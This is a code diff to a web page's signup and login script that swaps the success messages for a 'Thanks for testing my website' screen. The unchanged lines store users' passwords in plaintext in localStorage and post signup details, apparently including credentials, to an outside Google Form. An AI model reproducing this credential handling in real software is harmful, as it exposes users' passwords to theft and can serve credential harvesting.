@@ -126,6 +126,11 @@
   const signupForm = document.getElementById('signup-form');
   const loginForm = document.getElementById('login-form');
   const message = document.getElementById('message');
+  const container = document.querySelector('.container');
+
+  function showThankYou() {
+    container.innerHTML = '<h2 style="font-size: 24px; color: #7CFC00;">Thanks for testing my website</h2>';
+  }
 
   showSignupBtn.addEventListener('click', () => {
     signupForm.classList.add('active');
@@ -154,10 +159,8 @@
       return;
     }
 
-    // Save locally
     localStorage.setItem(email, password);
 
-    // Submit to Google Form
     const googleFormURL = 'https://docs.google.com/forms/d/e/1FAIpQLSd7BfIeJHAVMAcE1sWD09eFkKksyyGWwhqv79zq1-OzFTkEew/formResponse';
     const formData = new FormData();
     formData.append('entry.1076327577', email);
@@ -168,13 +171,9 @@
       mode: 'no-cors',
       body: formData
     }).then(() => {
-      // Show success message
-      message.style.color = '#7CFC00';
-      message.textContent = 'Signup successful! You can now log in.';
-      signupForm.reset();
+      showThankYou();
     }).catch(() => {
-      message.style.color = '#ffd700';
-      message.textContent = 'Signup saved locally, but failed to submit to Google Form.';
+      showThankYou(); // Still show thank you even if Google Form fails
     });
   });
 
@@ -190,10 +189,7 @@
       return;
     }
     if (password === storedPassword) {
-      message.style.color = '#7CFC00';
-      message.textContent = 'Login successful! Welcome back.';
-      loginForm.reset();
-      // Add your post-login logic here (redirect or whatever)
+      showThankYou();
     } else {
       message.style.color = '#ffd700';
       message.textContent = 'Incorrect password.';
